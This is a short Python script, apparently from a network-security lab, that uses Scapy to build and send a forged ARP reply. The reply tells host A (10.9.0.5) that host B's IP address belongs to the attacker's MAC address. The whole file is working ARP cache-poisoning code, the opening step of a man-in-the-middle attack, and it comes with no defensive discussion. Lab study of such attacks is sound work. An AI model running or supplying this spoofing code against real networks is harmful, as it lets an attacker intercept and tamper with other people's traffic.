from scapy.all import *

# Construct ARP reply packet
E = Ether()
A = ARP()
A.op = 2  # 2 for ARP reply
A.hwsrc = "02:42:0a:09:00:69"  # MAC address of the attacker machine (M)
A.psrc = "10.9.0.6"  # IP address of host B
A.hwdst = "02:42:0a:09:00:05"  # MAC address of host A
A.pdst = "10.9.0.5"  # IP address of host A

pkt = E / A

# Send the packet
sendp(pkt)

